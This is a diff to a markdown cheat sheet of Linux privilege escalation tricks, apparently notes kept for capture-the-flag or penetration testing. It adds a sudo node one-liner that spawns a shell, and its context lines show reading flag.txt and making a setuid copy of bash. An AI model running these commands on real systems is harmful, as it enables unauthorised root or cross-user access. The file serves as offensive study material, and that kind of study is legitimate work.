@@ -64,6 +64,9 @@ Poratble Database
 ###### import os
 ###### os.system('cat flag.txt')
 
+### Privilege Escalation abusing node
+#### sudo -u user node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
+
 ### Privilege Escalation with cp and chmod
 #### Copy the /bin/bash to /tmp/test
 #### chmod +xs /tmp/test && ./test
